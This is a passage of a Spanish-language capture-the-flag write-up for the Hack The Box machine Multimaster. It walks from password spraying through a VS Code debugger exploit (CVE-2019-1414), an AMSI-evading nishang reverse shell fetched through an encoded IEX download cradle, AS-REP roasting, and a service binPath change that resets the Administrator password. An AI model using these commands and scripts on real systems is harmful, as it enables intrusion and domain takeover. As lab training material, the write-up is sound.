SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:password1 STATUS_LOGON_FAILURE
```

Como antes `nmap` nos reporto que el puerto `5985` estaba abierto intentaremos conectarnos con estas credenciales con `evil-winrm`y visualizamos la primera flag `user.txt`


```bash
❯ evil-winrm -i 10.10.10.179 -u 'tushikikatomo' -p 'finance1'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\alcibiades\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> type user.txt
9d5ca88b1cafe75450e0b7a7b03c7834
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}


Enumerando un poco el sistema encontramos que se ejecuta el proceso `Code` correspondiente a `Visual Code`

```powershell
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    277      51    57564      74188               652   1 Code
    576      39    30472      72024              1212   1 Code
    403      53    96468     122704              5464   1 Code
    315      31    37032      62272              5576   1 Code
    397      21    16804      23172              5836   1 Code
    194      15     6112      12432              6056   1 Code
     63       4      708       3532              5832   0 CompatTelRunner
     93       8     1308       5884              4092   0 conhost
```


Vamos a la ruta, lo ejecutamos con el panel de ayuda y y este nos devuelve su version.

```powershell
*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin> .\code -h
Visual Studio Code 1.37.1

Usage: code.exe [options][paths...]
```


Despues de realizar una busqueda encontramos el `CVE-2019-1414` asociado a esta version para elevegar privilegios a traves de la exposicion de un debug listener.

![](/assets/images/HTB/htb-writeup-Multimaster/multi7.PNG)

Mayor detalle en el articulo a continuacion:

* [https://iwantmore.pizza/posts/cve-2019-1414.html]( https://iwantmore.pizza/posts/cve-2019-1414.html)


Usaremos la herramienta `cefdebug` de github para explotar esta vulnerabilidad

* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)

Nos descargamos el ejecutable y lo subimos a la maquina victima en este caso lo hare con un recurso compartido, pero se puede hacer de muchas maneras.

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```powershell
*Evil-WinRM* PS C:\WIndows\Temp\Priv> copy \\10.10.16.6\smbFolder\ceffdebug.exe ceffdebug.exe
```

Para ejecutarlo solo debemos seguir los pasos tal cual el repositorio.

```powershell
*Evil-WinRM* PS C:\WIndows\Temp\Priv> .\ceffdebug.exe
ceffdebug.exe : [2023/04/02 09:05:12:5013] U: There are 6 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/04/02 09:05:32:5800] U: There were 4 servers that appear to be CEF debuggers.
[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:11996/b1874235-1857-4869-9ded-b35ae9c0f43d
[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:52031/ef49c60c-66f9-448b-82a9-b08dc1a07022
[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1
[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:43978/c8928169-15af-4124-83a5-42b180e1b697
*Evil-WinRM* PS C:\WIndows\Temp\Priv> .\ceffdebug.exe --url ws://127.0.0.1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1 --code "process.mainModule.require('child_process').exec('ping 10.10.16.6')"
ceffdebug.exe : [2023/04/02 09:05:58:8202] U: >>> process.mainModule.require('child_process').exec('ping 10.10.16.6')
    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...ng 10.10.16.6'):String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/04/02 09:05:58:8202] U: <<< ChildProcess
```

y al ponernos en escucha con `tcpdump` recibimos la traza `icmp`

```bash
❯ tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:59:01.108853 IP 10.10.10.179 > 10.10.16.6: ICMP echo request, id 1, seq 1, length 40
15:59:01.108917 IP 10.10.16.6 > 10.10.10.179: ICMP echo reply, id 1, seq 1, length 40
15:59:02.150656 IP 10.10.10.179 > 10.10.16.6: ICMP echo request, id 1, seq 2, length 40
15:59:02.150666 IP 10.10.16.6 > 10.10.10.179: ICMP echo reply, id 1, seq 2, length 40
```

Lo siguiente sera ganar acceso a traves de una consola interactiva, para ello usaremos el script `Invoke-PowerShellTcp.ps1` del repositorio de `nishang`

* [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)


Ahora para poder realizar `AMSI bypass`, debemos editar el script cambiando el nombre de la funcion y borrando los comentarios para evitar problemas en la ejecucion.


```powershell
function dalecontodo 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
dalecontodo -Reverse -IPAddress 10.10.16.3 -Port 443
```

En la maquina victima ejecutaremos una peticion al script con `Iex` para que nos lo interprete, pero antes debemos hacerlo en un formato que windows entienda. Para ello usaremos `iconv` y lo transformaremos  a `base64` de este modo poder ejecutar la peticion con `powershell`

```bash
❯ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/PS.ps1')" | iconv -t utf-16le | base64 -w 0; echo
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMALwBQAFMALgBwAHMAMQAnACkA
```

Teniendo el formato adecuando podemos pasar a ejecutar el `cefdebug`.

Compartimos el `PS.ps1` y seguidamente con `rlwrap` y `ntcat` ponernos en escucha.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.179 - - [02/Apr/2023 16:23:11] "GET /PS.ps1 HTTP/1.1" 200 -
```

```powershell
*Evil-WinRM* PS C:\WIndows\Temp\Priv> .\ceffdebug.exe
ceffdebug.exe : [2023/04/02 09:28:38:6062] U: There are 3 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/04/02 09:28:58:6598] U: There were 1 servers that appear to be CEF debuggers.
[2023/04/02 09:28:58:6618] U: ws://127.0.0.1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe

*Evil-WinRM* PS C:\WIndows\Temp\Priv> .\ceffdebug.exe --url ws://127.0.0.1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe --code "process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwAHMAMQAnACkA')"
ceffdebug.exe : [2023/04/02 09:30:09:1259] U: >>> process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwA...
    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...wBQAFMALgBwA...:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/04/02 09:30:09:1269] U: <<< ChildProcess
```
y recimos una consola como el usuario `cyork`

```bash
❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:50183.
Windows PowerShell running as user cyork on MULTIMASTER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
megacorp\cyork
```

Listando los grupos del usuario, vemos que pertenece al grupo `Developers`; este grupo tiene acceso al directorio `inetpub\wwwroot`


Dentro encontramos archivos `dll`, concretamente un archivo de nombre `MultimasterAPI.dll` que procederemos a traernos a nuestra maquina.

```powershell
dir
    Directory: C:\inetpub\wwwroot\bin


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         1/7/2020   9:28 PM                roslyn                                                                
-a----        2/21/2013   7:13 PM         102912 Antlr3.Runtime.dll                                                    
-a----        2/21/2013   7:13 PM         431616 Antlr3.Runtime.pdb                                                    
-a----        5/24/2018   1:08 AM          40080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll                
-a----        7/24/2012  11:18 PM          45416 Microsoft.Web.Infrastructure.dll                                      
-a----         1/9/2020   4:13 AM          13824 MultimasterAPI.dll                                                    
-a----         1/9/2020   4:13 AM          28160 MultimasterAPI.pdb                                                    
-a----        2/17/2018   8:14 PM         664576 Newtonsoft.Json.dll                                                   
-a----       11/27/2018  11:30 PM         178808 System.Net.Http.Formatting.dll                                        
-a----       11/27/2018  11:28 PM          27768 System.Web.Cors.dll                                                   
-a----        1/27/2015   2:34 PM         139976 System.Web.Helpers.dll                                                
-a----       11/27/2018  11:31 PM          39352 System.Web.Http.Cors.dll                                              
-a----       11/27/2018  11:31 PM         455096 System.Web.Http.dll                                                   
-a----        1/31/2018  10:49 PM          77520 System.Web.Http.WebHost.dll                                           
-a----        1/27/2015   2:32 PM         566472 System.Web.Mvc.dll                                                    
-a----        2/11/2014   1:56 AM          70864 System.Web.Optimization.dll                                           
-a----        1/27/2015   2:32 PM         272072 System.Web.Razor.dll                                                  
-a----        1/27/2015   2:34 PM          41672 System.Web.WebPages.Deployment.dll                                    
-a----        1/27/2015   2:34 PM         211656 System.Web.WebPages.dll                                               
-a----        1/27/2015   2:34 PM          39624 System.Web.WebPages.Razor.dll                                         
-a----        7/17/2013   4:33 AM        1276568 WebGrease.dll                                                         
PS C:\inetpub\wwwroot\bin>
```

Vemos la lista de caracteres imprimibles con `strings`, pero al ser un ejecutable de windows usaremos el parametro `-e l` para que nos liste mayor informacion.


```bash
❯ strings -e l MultimasterAPI.dll
FROM
WHERE
LIKE
INFORMATION_SCHEMA
MASTER
{ "info" : "MegaCorp API" }
application/json
server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
```

Obtenemos una nueva contraseña y volveremos a validarla con `crackmapexec` si corrsponde a otro usuario.


```bash
❯ crackmapexec smb 10.10.10.179 -u users.txt -p 'D3veL0pM3nT!' --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT!
```

Con estas nuevas credenciales nos volvemos a conectar con `evil-winrm` y tendriamos acceso esta vez como `sbauer`

```bash
❯ evil-winrm -i 10.10.10.179 -u 'sbauer' -p 'D3veL0pM3nT!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sbauer\Documents> whoami
megacorp\sbauer
```

Seguidamente subiremos el ejecutable `sharphound.exe` para recopilar datos de `DC` que posteriormente con `bloodhound` interpretaremos.

Una vez tengamos el archivo en la maquina victima lo ejecutamos y este nos generara un archivo `.zip` que abriremos en `bloodhound`

```powershell
*Evil-WinRM* PS C:\WIndows\Temp\Privesc> .\SharpHound.exe -c All
2023-04-02T09:45:51.8354209-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-04-02T09:45:51.9916814-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote

*Evil-WinRM* PS C:\WIndows\Temp\Privesc> dir


    Directory: C:\WIndows\Temp\Privesc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/2/2023   9:47 AM          14062 20230402094551_BloodHound.zip
-a----         8/3/2022   9:21 AM        1060864 SharpHound.exe
-a----         4/2/2023   9:47 AM          13225 YThiODEyNWUtMTcwMC00YWY2LTgwZmYtNmIxMWU0MTM4ZDg5.bin
```

Subimos el `.zip` a bloodhound 

![](/assets/images/HTB/htb-writeup-Multimaster/multi8.PNG)


marcamos al usuario `sbauer` como `User as owned` y en analisys pinchamos en la opcion `Shortest Paths form Owned Principals`



![](/assets/images/HTB/htb-writeup-Multimaster/multi11.PNG)


Observamos que el usuario `sbauer` tiene el privilegio `Generic Write` sobre el usuario `Jorden` quien a su vez forma parte del grupo `Server Operators`


![](/assets/images/HTB/htb-writeup-Multimaster/multi12.PNG)

> GenericWrite - actualizar los atributos del objeto (por ejemplo, script de inicio de sesión)


Aprovecharemos el `Generic Write` para setear la propiedad `dont require Kerberos preauthentication` y con esto hacer al usuario `ASREPRoasteable`


```powershell
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Get-Aduser jorden | Set-ADAccountControl  -doesnotrequirepreauth $true
```

Con`GetNPUsers.py` esta vez si podamos obtener el hash

```bash
❯ GetNPUsers.py MEGACORP.LOCAL/ -no-pass -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User tushikikatomo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lana doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andrew doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jorden@MEGACORP.LOCAL:8e7ea2a50a1602c925cf681fca176a58$a2a1627ed23fe85bdadc88c1a0b551f0ee10dfe43f7677fc6f1204e36d5e849c95932313e7fae6b9829be5d69f243279f32098db2118abef962bb1b7fa2caafe91ca22d2747690dea014ecc6e9f95e2dffdd8acac823f47c7e29a834cf910daa4cbdc19187bbf95d436e083a050e274fd15905b15f58c2e9cc23932efcac112a2adf3a59fd3de0342d4d35e33f7da5aeb2be18db5aa625a95adbde5c075843711be01945177e8fd7935c8edc5355ee98fce7b9d4becbc72e14606e5c4df3b1577f19b621457089150499cf8a79616110fe973d7e63bbde78641380be90733b621190a13c13968c6ed3d2d9ea85bf9603
[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Procedamos a crackearlo con `john` y nos devuelve la contraseña en texto claro.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainforest786    ($krb5asrep$23$jorden@MEGACORP.LOCAL)
1g 0:00:00:06 DONE (2023-04-02 17:01) 0.1550g/s 682666p/s 682666c/s 682666C/s rainian..railezs05
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Nos conectamos nuevamente con `evil-winrm` y hubieramos migrado al usuario `jorden` 

```powershell
❯ evil-winrm -i 10.10.10.179 -u 'jorden' -p 'rainforest786'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jorden\Documents> whoami
megacorp\jorden
```

Antes vimos que este usuario formaba parte del grupo `Server Operators`, aprovecharemos esto para cambiar la propiedad `binpath` de un proceso el cual el forzaremos a desactivarse y al iniciarlo nuevamente nos ejecutara la sentencia que hayamos puesto. 


Cambiaremos el `binPath` del proceso `browser` para que al volver a iniciarse nos cambie la contraseña del usuario `Administrator`.

```powershell
*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe config browser binPath="C:\Windows\System32\cmd.exe /c net user Administrator fmiracle123$!"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe stop browser

SERVICE_NAME: browser
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0xafc8
*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start browser
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

Verificamos y efectivamente cambiamos las claves del usuario `Administrator`

```bash
❯ crackmapexec smb 10.10.10.179 -u 'Administrator' -p 'fmiracle123$!'
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\Administrator:fmiracle123$! (Pwn3d!)
```

Lo siguiente sera conectarnos, ir al directorio personal del usuario y visualizar la segunda flag `root.txt`

```powershell
❯ evil-winrm -i 10.10.10.179 -u 'Administrator' -p 'fmiracle123$!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
559ca9f9c145bc76f8504391a74710cc
```

y listo maquina pwneada!!







